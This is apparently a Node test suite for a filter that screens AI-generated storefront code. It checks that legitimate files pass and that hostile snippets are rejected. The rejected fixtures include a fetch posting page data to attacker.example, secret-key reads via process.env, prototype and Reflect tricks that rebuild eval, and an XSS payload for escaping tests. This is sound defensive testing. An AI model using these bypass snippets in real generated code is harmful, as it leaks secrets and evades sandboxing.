// AI store-file filter (lib/store-template/build.ts): rejectAiStoreFile / filterAiStoreFiles,
// plus the export-template security fixes that live next to it (R9 store key, JSON-LD
// escaping, R11 sandboxed custom components).
// Usage: node --test __tests__/store-file-filter.test.mjs
//
// Unlike the inlined-copy tests (store-health, generation-checkpoint …) this imports the
// real lib/store-template/build.ts, so the scanner under test can never drift from a
// copy. That relies on Node's built-in TypeScript type stripping (on by default since
// Node 22.18 / 23.6; the repo runs Node 24). build.ts only uses erasable TS syntax and
// type-only '@/…' imports, so no loader or transpile step is needed.

import { test } from 'node:test'
import assert from 'node:assert/strict'

const { rejectAiStoreFile, filterAiStoreFiles, isAllowedStorePath, buildStoreFiles } =
  await import(new URL('../lib/store-template/build.ts', import.meta.url).href)
const { AURA_MANIFEST } = await import(new URL('../lib/sample-manifest.ts', import.meta.url).href)

const BS = String.fromCharCode(92) // a backslash, spelled out so no tool rewrites escapes

function allowed(path, src) {
  assert.equal(rejectAiStoreFile(path, src), null, `expected ${path} to be allowed`)
}
function rejected(path, src, reasonPart) {
  const why = rejectAiStoreFile(path, src)
  assert.ok(why, `expected ${path} to be rejected:\n${src}`)
  if (reasonPart) assert.match(why, reasonPart)
}

// ─── Regression: ordinary copy must not drop legitimate files ────────────────

test('product data with label "Function" and tag "global" is allowed', () => {
  allowed('data/products.ts', [
    "import type { StoreProduct } from '@/types/store-code'",
    '',
    'export const products: StoreProduct[] = [',
    '  {',
    "    id: 'p1', slug: 'function-tee', name: 'Function Tee', label: 'Function',",
    "    description: \"It's our global best-seller. The process is simple: require nothing, eval everything.\",",
    "    price: 29, images: ['https://images.example.com/tee.jpg'], available: true,",
    "    tags: ['global', 'eval', 'process', 'module', 'require', 'globalThis', 'window', 'cookie'],",
    '  },',
    ']',
    '// global note: the Function tee ships worldwide (process takes 2 days)',
    '/* module: eval — require */',
    '',
  ].join('\n'))
})

test('store config with those words in strings, templates and comments is allowed', () => {
  allowed('data/config.ts', [
    "import type { StoreConfig } from '@/types/store-code'",
    'const year = 2026',
    'export const config: StoreConfig = {',
    "  brand: { name: 'Global Goods', tagline: `Function first since ${year} — global process`, currency: 'EUR', language: 'en', country: 'CZ' },",
    "  seo: { title: 'Global Goods', description: 'Form follows Function. No eval, no require.' },",
    "  design: { colors: { bg: '#fff', text: '#111', accent: '#0a0', accentText: '#fff', muted: '#666', surface: '#fafafa', border: '#eee' }, fonts: { heading: 'Inter', body: 'Inter' }, radius: '8px' },",
    "  nav: [{ label: 'Global', href: '/collections/global' }],",
    "  footer: { columns: [], legal: '© Global Goods — module 3' },",
    '}',
    "export const pattern = /global'process/g",
    'export const half = year / 2 / 1',
    "for (const t of ['global', 'Function']) void t",
    'export default [\'module\']',
    '',
  ].join('\n'))
})

test('JSX text such as "Global shipping" is allowed in a page component', () => {
  allowed('components/store/HomePage.tsx', [
    "'use client'",
    "import Link from 'next/link'",
    "import { useState } from 'react'",
    "import { products } from '@/data/products'",
    '',
    'export default function HomePage() {',
    '  const [open, setOpen] = useState<boolean>(false)',
    '  const perRow = products.length > 3 ? products.length / 3 : 1',
    '  return (',
    '    <main className="p-4" data-x={perRow}>',
    "      <h1>Global shipping — don't worry, it's free</h1>",
    '      <p>Our process is simple. Function over form. No module required.</p>',
    '      <p>{open ? <span>Global</span> : null} {`Item global ${perRow}`}</p>',
    '      {products.length > 0 && <ul>{products.map((p) => <li key={p.id}>{p.name}</li>)}</ul>}',
    '      <button onClick={() => setOpen(!open)}>Toggle</button>',
    '      <Link',
    '        // a comment between attributes: global process',
    '        href="/products"',
    '      >Shop worldwide</Link>',
    '      {/* eval-free zone */}',
    '    </main>',
    '  )',
    '}',
    '',
  ].join('\n'))
})

test('relative fetch and public env reads are allowed', () => {
  allowed('components/store/Shipping.tsx', [
    "'use client'",
    "const SITE = process.env.NEXT_PUBLIC_SITE_URL ?? ''",
    "export async function load() { return fetch('/api/shipping', { cache: 'no-store' }) }",
    'export default function Shipping() { return <p>{SITE}</p> }',
    '',
  ].join('\n'))
})

// ─── Real code usages stay blocked ───────────────────────────────────────────

test('process.env secrets are rejected in every spelling', () => {
  rejected('components/A.tsx', 'export default function A() { return <p>{process.env.QUANTE_API_KEY}</p> }', /process/)
  rejected('lib/a.ts', 'const { env } = process\nexport const k = env.STRIPE_SECRET_KEY', /process/)
  rejected('lib/a.ts', "export const k = process['env']", /process/)
  rejected('lib/a.ts', 'export const k = process /* c */ .env.QUANTE_API_KEY', /process/)
})

test('eval, Function, globalThis, global and require are rejected', () => {
  rejected('lib/a.ts', 'export const run = (s: string) => eval(s)', /eval/)
  rejected('lib/a.ts', "export const f = Function('return 1')", /Function/)
  rejected('lib/a.ts', 'export const g = globalThis', /globalThis/)
  rejected('lib/a.ts', 'export const g = global', /global/)
  rejected('lib/a.ts', "export const r = require('x')", /require/)
})

test('computed access and constructor tricks are rejected', () => {
  rejected('lib/a.ts', "const w: any = {}\nexport const e = w['ev' + 'al']", /computed access/)
  rejected('lib/a.ts', 'const w: any = {}\nexport const e = w[`Func${""}tion`]', /computed access/)
  rejected('lib/a.ts', 'export const F = [].map.constructor', /constructor/)
  rejected('lib/a.ts', "export const F = ([] as any)['constructor']", /constructor/)
})

test('fetch to an external host is rejected', () => {
  rejected('components/B.tsx', "'use client'\nexport default function B() { fetch('https://attacker.example/c', { method: 'POST', body: document.title }); return null }", /external URL/)
  rejected('components/B.tsx', "const U = 'https://attacker.example'\nexport default function B() { fetch(U); return null }", /external URL/)
  rejected('components/B.tsx', "export default function B() { window.fetch(`//attacker.example/${1}`); return null }", /external URL/)
  rejected('components/B.tsx', "export default function B() { navigator.sendBeacon('/x', 'y'); return null }", /network API/)
})

test('imports of locked platform modules, route handlers and server APIs are rejected', () => {
  rejected('components/C.tsx', "import { platformUrl } from '@/lib/platform'\nexport default function C() { return null }", /locked platform module/)
  rejected('components/store/C.tsx', "import * as p from '../../lib/platform.ts'\nexport default function C() { return null }", /locked platform module/)
  rejected('lib/c.ts', "export * from './platform'", /locked platform module/)
  rejected('components/C.tsx', "import { POST } from '@/app/api/checkout/route'\nexport default function C() { return null }", /locked platform module/)
  rejected('lib/c.ts', "import { cookies } from 'next/headers'", /next\/headers/)
  rejected('lib/c.ts', "import fs from 'fs'", /Node built-in/)
  rejected('lib/c.ts', "export const m = import('no' + 'de:fs')", /dynamic import/)
  rejected('lib/c.ts', "'use server'\nexport async function act() {}", /use server/)
})

test('escaped identifiers and lexer-confusion tricks are rejected', () => {
  rejected('lib/a.ts', `export const z = ${BS}u0070rocess`, /escaped/)
  // Generic function type followed by a `</T>/` "closing tag" (TS reads it as `<` + regex).
  rejected('components/D.tsx', "const f: <T>() => void = () => (fetch('/x?' + process.env.QUANTE_API_KEY) as any) </T>/g\nexport default f", /process/)
  // TS non-null assertion followed by division, not a regex literal.
  rejected('lib/y.ts', 'const b = 1\nexport const z = [b! / (process.env.QUANTE_API_KEY as any) / 1]', /process/)
  // Postfix ++ followed by division.
  rejected('lib/y.ts', 'let i = 0\nexport const z = i++ / (globalThis as any).x / 1', /globalThis/)
})

// ─── Path allowlist ──────────────────────────────────────────────────────────

test('path allowlist is still enforced', () => {
  for (const p of ['app/api/x/route.ts', 'app/sitemap.ts', 'middleware.ts', 'proxy.ts', '.env', 'package.json',
    'vercel.json', 'next.config.ts', 'public/x.ts', 'app/../x.tsx', 'components/.hidden.tsx', `components${BS}x.tsx`, '/app/page.tsx']) {
    assert.equal(isAllowedStorePath(p), false, p)
    assert.equal(rejectAiStoreFile(p, 'export const x = 1'), 'path not allowed', p)
  }
  for (const p of ['app/page.tsx', 'app/shop/[slug]/page.tsx', 'components/store/HomePage.tsx', 'data/products.ts', 'styles/store.css']) {
    assert.equal(isAllowedStorePath(p), true, p)
  }
})

test('filterAiStoreFiles keeps good files and reports dropped ones', () => {
  const { files, dropped } = filterAiStoreFiles({
    'data/products.ts': "export const products = [{ name: 'Function', tags: ['global'] }]",
    'components/Evil.tsx': "import { platformUrl } from '@/lib/platform'\nexport default function E() { return null }",
    'app/api/leak/route.ts': 'export function GET() {}',
  })
  assert.deepEqual(Object.keys(files), ['data/products.ts'])
  assert.deepEqual(dropped.map((d) => d.path).sort(), ['app/api/leak/route.ts', 'components/Evil.tsx'])
})

// ─── R9: the store key is not reachable through a shared module ──────────────

test('code-gen build: lib/platform.ts carries no key helper; only locked routes read the key', () => {
  const files = buildStoreFiles({
    'data/products.ts': "import type { StoreProduct } from '@/types/store-code'\nexport const products: StoreProduct[] = [{ id: 'a', name: 'Function Tee', description: 'global', price: 1, images: [], slug: 'a', available: true }]\n",
    'components/Evil.tsx': "import { platformUrl } from '@/lib/platform'\nexport default function E() { return null }\n",
  })
  const byPath = new Map(files.map((f) => [f.path, f.content]))
  assert.ok(byPath.get('data/products.ts').includes('Function Tee'))
  assert.equal(byPath.has('components/Evil.tsx'), false)
  const platform = byPath.get('lib/platform.ts')
  assert.ok(platform, 'lib/platform.ts is part of the scaffold')
  assert.equal(platform.includes('process.env.QUANTE_API_KEY'), false)
  assert.equal(/export\s+function\s+platformHeaders/.test(platform), false)
  const keyReaders = files.filter((f) => f.content.includes('process.env.QUANTE_API_KEY')).map((f) => f.path)
  assert.ok(keyReaders.length > 0)
  for (const p of keyReaders) assert.match(p, /^app\/api\/.+\/route\.ts$/, p)
})

// ─── Legacy export: JSON-LD escaping + sandboxed custom components (R11) ─────

function legacyExport() {
  const manifest = structuredClone(AURA_MANIFEST)
  manifest.catalog.products[0].name = '</script><script>alert(1)</script>'
  manifest.pages.home.push({ type: 'customComponent', ref: 'promo' })
  const code = "export default function Promo() { return <div>Sale</div> }\n"
  return buildStoreFiles(manifest, [{ ref: 'promo', name: 'Promo', code }, { ref: '../evil', name: 'x', code }])
}

test('legacy export: product JSON-LD is emitted through an HTML-safe serializer', () => {
  const page = legacyExport().find((f) => f.path === 'app/products/[slug]/page.tsx').content
  assert.ok(!page.includes('__html: JSON.stringify('), 'raw JSON.stringify must not reach __html')
  assert.ok(page.includes('__html: jsonLdHtml(jsonLd)'))
  // Evaluate the emitted helper (strip its one type annotation) on hostile input.
  const start = page.indexOf('function jsonLdHtml')
  const fnSrc = page.slice(start, page.indexOf('\n}\n', start) + 2).replace('(value: unknown): string', '(value)')
  const jsonLdHtml = new Function(`${fnSrc}; return jsonLdHtml`)()
  const out = jsonLdHtml({ name: '</script><b>&' + String.fromCharCode(0x2028) })
  assert.equal(/[<>&]/.test(out) || out.includes(String.fromCharCode(0x2028)), false, out)
  assert.equal(JSON.parse(out).name, '</script><b>&' + String.fromCharCode(0x2028))
})

test('legacy export: custom components render only inside a sandboxed iframe', () => {
  const files = legacyExport()
  const paths = files.map((f) => f.path)
  assert.equal(paths.some((p) => /^components\/custom\/(?!sources\.ts$|SandboxedComponent\.tsx$)/.test(p)), false, 'no native component modules')
  assert.equal(paths.some((p) => p.includes('..')), false)
  const frame = files.find((f) => f.path === 'components/custom/SandboxedComponent.tsx').content
  assert.ok(frame.includes('sandbox="allow-scripts"'))
  assert.equal(/<iframe[^>]*allow-same-origin/.test(frame), false)
  const sources = files.find((f) => f.path === 'components/custom/sources.ts').content
  assert.ok(sources.includes("connect-src 'none'"))
  assert.equal(sources.includes('</script><script'), false)
  const renderer = files.find((f) => f.path === 'components/storefront/SectionRenderer.tsx').content
  assert.ok(renderer.includes('<SandboxedComponent'))
  assert.equal(renderer.includes('CustomComponentFrame'), false)
})

test('white-label scrub keeps components/custom/sources.ts parseable', async () => {
  const { scrubBranding, hasQuanteRefs } = await import(new URL('../lib/export-scrub.ts', import.meta.url).href)
  const manifest = structuredClone(AURA_MANIFEST)
  manifest.pages.home.push({ type: 'customComponent', ref: 'quantePromo' })
  const code = [
    'export default function Promo() {',
    '  return <div><a href="https://quante.app">Quante</a> <a href=\'https://my.stores.quantecode.com/x\'>x</a>',
    '    <p>built with Quante — enjoy</p><span>{"</script>"}</span></div>',
    '}',
    '',
  ].join('\n')
  const built = buildStoreFiles(manifest, [{ ref: 'quantePromo', name: 'Promo', code }])
  const scrubbed = scrubBranding(built.map((f) => ({ path: f.path, content: f.content })))
  const sources = scrubbed.find((f) => f.path === 'components/custom/sources.ts').content
  assert.equal(hasQuanteRefs([{ path: 'components/custom/sources.ts', content: sources }]).found, false, sources)
  const entries = sources.split('\n').filter((l) => /^\s+"/.test(l))
  assert.equal(entries.length, 1)
  const m = /^\s+("(?:[^"\\\n]|\\.)*"): ("(?:[^"\\\n]|\\.)*"),$/.exec(entries[0])
  assert.ok(m, 'entry is still a well-formed key: "literal" pair')
  assert.equal(JSON.parse(m[1]), 'builderPromo')
  const html = JSON.parse(m[2])
  const inner = /<script type="application\/json" id="__qcc_src">([\s\S]*?)<\/script>/.exec(html)
  assert.ok(inner)
  const src = JSON.parse(inner[1])
  assert.ok(src.includes('href=""'), src)
  assert.ok(src.includes('{"</script>"}'), 'component source survives intact apart from branding')
  assert.equal(/quante/i.test(src), false, src)
  // The data file that references the ref is renamed the same way.
  const data = scrubbed.filter((f) => f.content.includes('builderPromo')).map((f) => f.path)
  assert.ok(data.some((p) => p !== 'components/custom/sources.ts'), 'ref is renamed consistently')
})

test('sandbox CDN pins match the Studio preview route', async () => {
  const { readFile } = await import('node:fs/promises')
  const route = await readFile(new URL('../app/api/preview/component/route.ts', import.meta.url), 'utf8')
  const sources = legacyExport().find((f) => f.path === 'components/custom/sources.ts').content
  const html = JSON.parse(/^\s+"[^"]*": ("(?:[^"\\\n]|\\.)*"),$/m.exec(sources)[1])
  const pins = [...html.matchAll(/<script src="([^"]+)" integrity="([^"]+)"/g)]
  assert.equal(pins.length, 4)
  for (const [, src, integrity] of pins) {
    assert.ok(route.includes(`'${src}'`), `preview route lacks ${src}`)
    assert.ok(route.includes(`'${integrity}'`), `preview route has a different pin for ${src}`)
  }
})

test('legacy export without custom components builds its own SectionRenderer', () => {
  const files = buildStoreFiles(structuredClone(AURA_MANIFEST), [])
  const renderer = files.find((f) => f.path === 'components/storefront/SectionRenderer.tsx').content
  assert.equal(renderer.includes('CustomComponentFrame'), false)
  assert.equal(files.some((f) => f.path.startsWith('components/custom/')), false)
})

// ─── Regression: final-audit bypass class (F7/F9) must stay closed ───────────
// Each snippet rebuilds a denied capability (Function constructor, process, network)
// from pieces the old lexical denylist could not see. The AST allowlist pass must
// reject every one of them.

const PAGE = 'app/page.tsx'
const wrap = (body) => `export default function Page() {\n${body}\n  return <div>ok</div>\n}\n`

test('audit F9: prototype lookup via Reflect + string concatenation is rejected', () => {
  rejected(PAGE, wrap("  const F = Reflect.get(Object.getPrototypeOf(() => 0), 'con' + 'structor')"))
})

test('Reflect and Proxy are rejected outright', () => {
  rejected(PAGE, wrap('  const r = Reflect.ownKeys({})'))
  rejected(PAGE, wrap('  const p = new Proxy({}, {})'))
})

test('Object.getPrototypeOf / setPrototypeOf / descriptors are rejected', () => {
  rejected(PAGE, wrap('  const proto = Object.getPrototypeOf([])'))
  rejected(PAGE, wrap('  Object.setPrototypeOf({}, null)'))
  rejected(PAGE, wrap('  const d = Object.getOwnPropertyDescriptor({}, "x")'))
})

test('forbidden property names are rejected in every syntactic position', () => {
  rejected(PAGE, wrap('  const { constructor: C } = []'))
  rejected(PAGE, wrap('  const o = { __proto__: null }'))
  rejected(PAGE, wrap('  const p = [].map.prototype'))
  rejected(PAGE, wrap("  const x = ([] as any)?.['constructor']"))
})

test('forbidden names assembled from constant pieces are rejected', () => {
  rejected(PAGE, wrap("  const k = ['con', 'structor'].join('')\n  const x = ([] as any)[k]"))
  rejected(PAGE, wrap('  const k = `con${""}structor`\n  const x = ([] as any)[k]'))
  rejected(PAGE, wrap('  const k = String.fromCharCode(112, 114, 111, 99, 101, 115, 115)'))
})

test('the with statement is rejected', () => {
  rejected('components/store/Thing.ts', 'export function f(o: any) { with (o) { return 1 } }\n')
})

test('dynamic import and non-allowlisted modules are rejected', () => {
  rejected(PAGE, wrap("  const m = import('node:' + 'fs')"))
  rejected(PAGE, "import x from 'next/dist/server/base-server'\n" + wrap(''))
  rejected(PAGE, "import x from 'left-pad'\n" + wrap(''))
})

test('process reached through globalThis is rejected', () => {
  rejected(PAGE, wrap('  const p = (globalThis as any).process'))
})

test('server-side fetch with a computed URL is rejected', () => {
  rejected(PAGE, "export default async function Page() {\n  const u = ['https:', '//example.org/x'].join('')\n  await fetch(u)\n  return <div>ok</div>\n}\n")
})

// ─── Editable storefront UI (unlocked 2026-09) ───────────────────────────────

const { getEditableScaffoldFiles, EDITABLE_SCAFFOLD_FILES, PLATFORM_LOCKED_FILES } =
  await import(new URL('../lib/store-template/build.ts', import.meta.url).href)

test('every editable scaffold file passes the AI filter as shipped', () => {
  const files = getEditableScaffoldFiles()
  assert.deepEqual(Object.keys(files).sort(), [...EDITABLE_SCAFFOLD_FILES].sort())
  for (const [p, src] of Object.entries(files)) allowed(p, src)
})

test('an AI copy of an editable file overrides the scaffold at build', () => {
  const navbar = 'export function Navbar() { return <header>Custom</header> }\n'
  const built = buildStoreFiles({ 'components/layout/Navbar.tsx': navbar })
  assert.equal(built.find((f) => f.path === 'components/layout/Navbar.tsx').content, navbar)
})

test('editable files must keep what the engine depends on', () => {
  const files = getEditableScaffoldFiles()
  rejected('app/layout.tsx', files['app/layout.tsx'].replace(/<\/?CartProvider>/g, ''), /CartProvider/)
  rejected('app/layout.tsx', files['app/layout.tsx'].replace('<CookieConsent />', ''), /CookieConsent/)
  rejected('components/layout/Footer.tsx', files['components/layout/Footer.tsx'].replace('"/privacy"', '"/x"'), /privacy/)
  rejected('app/cart/page.tsx', files['app/cart/page.tsx'].replace("fetch('/api/checkout'", "fetch('/api/other'"), /checkout/)
  rejected('app/success/page.tsx', files['app/success/page.tsx'].replace('clearCart()', 'void 0'), /clearCart/)
})

test('platform-managed files are rejected and never override the scaffold', () => {
  for (const p of ['app/contact/page.tsx', 'app/terms/page.tsx', 'lib/i18n.ts', 'components/legal/LegalPageView.tsx']) {
    assert.ok(PLATFORM_LOCKED_FILES.has(p))
    rejected(p, 'export default function P() { return null }\n', /managed by the platform/)
  }
  const built = buildStoreFiles({ 'app/contact/page.tsx': 'export default function P() { return null }\n' })
  assert.match(built.find((f) => f.path === 'app/contact/page.tsx').content, /LegalPageView/)
})
